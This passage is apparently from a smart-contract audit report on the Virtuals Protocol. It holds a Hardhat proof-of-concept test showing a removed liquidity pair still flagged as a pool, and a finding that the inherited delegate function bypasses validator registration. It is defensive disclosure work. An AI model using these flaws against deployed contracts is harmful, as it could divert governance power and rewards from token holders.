event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Removed liquidity pair still accrues taxes\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken} = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u0026quot;AgentToken\u0026quot;, agent.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapV2Pair = await agentToken.uniswapV2Pair();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;uniswapV2Pair: \u0026quot;, uniswapV2Pair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.connect(deployer).removeLiquidityPool(uniswapV2Pair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Should still assert isLiquidityPool as true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentToken.isLiquidityPool(uniswapV2Pair)).to.be.eq(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\" style=\"position:relative;\"\u003e\u003ca href=\"#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\" aria-label=\"m 14 votesupgradeabledelegate bypasses the addvalidator call leads to a non validator holding voting power along with loss of rewards permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-52\"\u003e[M-14] \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e bypasses the \u003ccode\u003eaddValidator\u003c/code\u003e call, leads to a non-validator holding voting power along with loss of rewards\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-557\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-8\" aria-label=\"finding description 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59\"\u003e\u003ccode\u003eAgentVeToken::stake\u003c/code\u003e\u003c/a\u003e allows users to stake their tokens in exchange of the power to delegate voting power to a delegatee.\nThis delegatee can now take part in the governance process via \u003ccode\u003eAgentDAO\u003c/code\u003e contract.\u003c/p\u003e\n\u003cp\u003eThese delegates are rewarded via \u003ccode\u003eAgentReward\u003c/code\u003e contract, this is performed via storing the validators during stake.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);        \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Validators are added to the registry every time a stake happens.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis registry is used inside the \u003ccode\u003eAgentRewardV2\u003c/code\u003e and \u003ccode\u003eAgentRewardV3\u003c/code\u003e contract via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L223\"\u003e\u003ccode\u003e_distributeValidatorRewards\u003c/code\u003e\u003c/a\u003e and \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV3.sol#L308\"\u003e\u003ccode\u003eclaimAllValidatorRewards\u003c/code\u003e\u003c/a\u003e respectively. However, there’s a loophole which allows stakers (which includes the founder) to delegate their votes to someone else who is not even a validator. This can be done via the \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e, the \u003ccode\u003eVotesUpgradeable\u003c/code\u003e is deeply nested, the way to reach this file is shown below:\u003c/p\u003e\n\u003cp\u003e(consider \u003ccode\u003e-\u003e\u003c/code\u003e as \u003ccode\u003einherits\u003c/code\u003e keyword)\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"82\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgentVeToken -\u0026gt; ERC20Votes -\u0026gt; ERC20VotesUpgradeable -\u0026gt; VotesUpgradeable \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e     * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Delegates votes from the sender to \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`delegatee`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e     */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs we can observe, this functionality by-passes the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133\"\u003e\u003ccode\u003eAgentNftV2::addValidator\u003c/code\u003e\u003c/a\u003e call; hence, allowing a non-validator to be involved in the governance process and at the same time, rewards would lost for both the staker and delegatee.\u003c/p\u003e\n\u003ch3 id=\"impact-12\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-12\" aria-label=\"impact 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAllows delegation to a non-validator (breaking core functionality).\u003c/li\u003e\n\u003cli\u003eNo validator would be added here to the registry upon \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e call.\u003c/li\u003e\n\u003cli\u003eNo party here earns any rewards via \u003ccode\u003eAgentReward\u003c/code\u003e contracts.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChanging delegates via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59\"\u003e\u003ccode\u003eAgentVeToken::stake\u003c/code\u003e\u003c/a\u003e is sub-optimal, so the recommended solution would be to override the \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e and modify it to add the \u003ccode\u003eaddValidator\u003c/code\u003e call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" 